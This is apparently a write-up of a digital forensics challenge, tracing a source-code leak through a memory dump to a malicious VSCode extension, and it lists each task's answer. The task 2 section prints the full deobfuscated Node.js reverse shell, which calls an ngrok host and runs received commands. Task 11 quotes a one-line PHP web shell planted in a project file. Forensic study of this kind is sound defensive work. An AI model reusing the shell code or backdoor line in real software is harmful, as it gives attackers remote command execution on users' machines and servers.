


---




#### Sherlock Scenario

We have discovered a serious security breach involving the unauthorized exposure of our source code. An employee has been identified as a potential suspect in this incident. However, the employee strongly denies any involvement or downloading of external programs. We seek your expertise in digital forensic investigation to perform a comprehensive analysis, determine the root cause of the leak, and help us resolve the situation effectively.


----




Task 1

What is the application that starts the suspicious chain of processes?

```
Code.exe
```



Start by analyzing the memory dump with volatility and use the cmdline plugin to extract commandline arguments


We find this suspicious process. RuntimeBroker never runs in this location, its a native windows process that lives in system32
<img width="3309" height="1286" alt="image" src="https://github.com/user-attachments/assets/f08ee9ff-e0cb-40ed-9c83-5ca78ffd182f" />

Following the chain, we can see it was spawned by cmd.exe which was spawned by Code.exe














Task 2

Provide the full path of the malicious file used to gain initial access.

```
C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
```





We know Code.exe aka VSCode started it, therefore we can use filescan to dump all files
```
vol3 -f memdump.dmp windows.filescan > filescan.txt
```
then search through the file for "vscode" which gives us everything related to vscode
<img width="1613" height="399" alt="image" src="https://github.com/user-attachments/assets/57be5df4-51c0-4905-ba27-a4ab825c3a17" />

We see this suspicious looking extension. Lets further investigate it by searching for it again in filescan dump
<img width="1473" height="336" alt="image" src="https://github.com/user-attachments/assets/3c65c063-09fd-4f67-9551-aaecf3bc7468" />

Continue by investigating the javascript since it handles execution of code. Note its adress on the left and dump it

```
vol3 -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd2e704f0
```

Now we can see its contents
<img width="2401" height="1242" alt="image" src="https://github.com/user-attachments/assets/6529ac70-b031-4b51-917f-8817be023f96" />


Looking through it, we see an obfuscated section of code
<img width="3268" height="313" alt="image" src="https://github.com/user-attachments/assets/2f929449-654b-4543-80b1-d8c71e062bc4" />

When we deobfuscate it, we find out its a reverse shell. Here is the deobfuscated code

```
const fs = require('fs');
const net = require('net');
const path = require('path');
const os = require('os');
const { pid } = require('process');

const lockFilePath = path.join(os.homedir(), "." + pid + ".lock");

if (!fs.existsSync(lockFilePath)) {
  fs.writeFile(lockFilePath, "", () => {});

  const socket = new net.Socket();

  socket.connect(16587, "6.tcp.eu.ngrok.io");

  socket.on("data", data => {
    const command = data.toString();

    require("child_process").exec(command, (error, stdout, stderr) => {
      if (error) {
        socket.write(stderr);
      } else {
        socket.write(stdout);
      }
    });
  });

  socket.on("close", () => {
    console.log("closed");
  });
}
```


Task 3

What user input, when executed, will run the malicious code?

```
help
```




<img width="3222" height="1101" alt="image" src="https://github.com/user-attachments/assets/3f593c83-364c-44e7-bec3-6edb9e1a2a30" />








Task 4

What are the hostname and port used to establish a reverse shell?

```
6.tcp.eu.ngrok.io:16587
```


refer to the deobfuscated code in q2










Task 5

What is the display name of the developer who created this malicious file?

```
0xS1rx58.D3V
```




dump the package.json file
```
vol3 -f memdump.dmp  windows.dumpfiles --virtaddr 0x850cd16d92b0
```
<img width="2147" height="1190" alt="image" src="https://github.com/user-attachments/assets/68437c6e-094a-4bf0-b8ff-6c3540e5a587" />








Task 6

What time was the malicious file released? (UTC).

```
2024-07-23 00:41:19
```



https://web.archive.org/web/20240729232553/https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T

Then convert to UTC









Task 7

Provide the SID for the user who has been compromised.

```
S-1-5-21-1998887770-13753423-1649717590-1001
```





We can use the getsid plugin to retrieve User2´s sid
```
vol3 -f memdump.dmp  windows.getsid > sid.txt
```

<img width="1377" height="388" alt="image" src="https://github.com/user-attachments/assets/d1d1af21-e7c6-4371-87fa-8064dd3881a1" />





Task 8

Provide the full path of the suspicious executable being run during the infection chain.


```
C:\Users\Public\RuntimeBroker.exe
```



<img width="1531" height="253" alt="image" src="https://github.com/user-attachments/assets/9cf08ad6-6d5e-4f4e-b1fe-fef39a825d01" />


Refer to the chain/output in Q1






Task 9

The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.

```
Recycle Bin
```





<img width="2660" height="1203" alt="image" src="https://github.com/user-attachments/assets/e04afd57-fe90-4e96-8b96-76741b67f2d2" />


**Recycle Bin CLSID**:

```
{645FF040-5081-101B-9F08-00AA002F954E}
```





Task 10

Which MITRE technique corresponds to the previous action?


```
T1546.015
```

https://attack.mitre.org/techniques/T1546/015/





Task 11

The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?

```
$testc = $_GET['s1']; echo `$testc`;
```


